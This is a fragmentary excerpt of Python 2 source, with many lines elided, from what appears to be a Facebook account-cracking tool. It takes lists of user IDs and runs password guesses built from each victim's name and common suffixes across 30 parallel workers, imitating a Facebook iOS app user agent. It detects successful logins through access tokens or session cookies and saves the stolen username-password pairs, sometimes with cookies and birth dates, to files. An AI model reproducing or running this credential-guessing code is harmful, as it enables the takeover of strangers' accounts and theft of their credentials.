...
def menu():
    ...
    if mr_profaisor == '':
        ...
        try:
            ...
            hps_nm = nm_file.replace('.txt', '').replace('OKK', '').replace('CPP', '')
...
class __crack__():
    ...
    def __api__(self, user, __yan__):
        global loop
        (
         sys.stdout.write('\r[%s\x1b[1;92mR\xe2\x99\xa1S%s] [crack] %s/%s -> \x1b[1;92mOKK\x1b[1;97m-:\x1b[1;92m%s - \x1b[1;93mCPP\x1b[1;97m-:\x1b[1;93m%s \x1b[1;97m' % (O, N, loop, len(self.id), len(ok), len(cp))),)
        sys.stdout.flush()
        for pw in __yan__:
            pw = pw.lower()
            try:
            ...
            if 'access_token' in response.text and 'EAAA' in response.text:
                print '\r%s[OKK] %s | %s   %s' % (H, user, pw, N)
                wrt = ' [\xe2\x9c\x93] %s|%s' % (user, pw)
                ok.append(wrt)
                open('saved/OKK-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
                break
                continue
                ...
                try:
                    ...
                    print '\r%s[CPP] %s | %s | %s %s %s%s' % (K, user, pw, day, month, year, N)
                    wrt = ' [\xc3\x97] %s|%s|%s %s %s' % (user, pw, day, month, year)
                    cp.append(wrt)
                    open('saved/CPP-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
                    break
                except (KeyError, IOError):
                    month = ''
                    day = ''
                ...
                print '\r%s[CPP] %s | %s %s' % (K, user, pw, N)
    ...
    def __mbasic__(self, user, __yan__):
        global loop
        (
         sys.stdout.write('\r[%s\x1b[1;92mMR\xe2\x99\xa1SULTANI%s] [crack] %s/%s -> \x1b[1;92mOKK\x1b[1;97m-:\x1b[1;92m%s - \x1b[1;93mCPP\x1b[1;97m-:\x1b[1;93m%s \x1b[1;97m' % (O, N, loop, len(self.id), len(ok), len(cp))),)
        sys.stdout.flush()
        for pw in __yan__:
            pw = pw.lower()
            try:
            ...
            if 'c_user' in ses.cookies.get_dict().keys():
                ...
                print '\r%s[OKK] %s | %s | %s %s' % (H, user, pw, kuki, N)
    ...
    def __mfb__(self, user, __yan__):
        ...
        for pw in __yan__:
            ...
            try:
                ...
                _sultani = 'Mozilla/5.0 (iPhone; CPU iPhone OS 11_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E216 [FBAN/FBIOS;FBAV/170.0.0.60.91;FBBV/105964764;FBDV/iPhone10,1;FBMD/iPhone;FBSN/iOS;FBSV/11.3;FBSS/2;FBCR/Sprint;FBID/phone;FBLC/en_US;FBOP/5;FBRV/106631002;]'
                ...
                for yntkts in self.id:
                    try:
                        ...
                        if len(xz) == 3 or len(xz) == 4 or len(xz) == 5 or len(xz) == 6:
                            pwx = [name, xz[0] + '123', xz[0] + '12345', xz[0] + '12', '321', '1212', '123123']
                        else:
                            pwx = [name, xz[0] + '123', xz[0] + '12345', xz[0] + '12', '321', '1212', '123123']
            ...
            with mking__pass(max_workers=30) as (__mking__):
                for yntkts in self.id:
                    try:
                        ...
                        xz = name.split(' ')
                        if len(xz) == 3 or len(xz) == 4 or len(xz) == 5 or len(xz) == 6:
                            pwx = [name, xz[0] + '123', xz[0] + '12345', xz[0] + '1122', '321', '1212', '123123']
                        else:
                            pwx = [name, xz[0] + '123', xz[0] + '12345', xz[0] + '1122', '321', '1212', '123123']
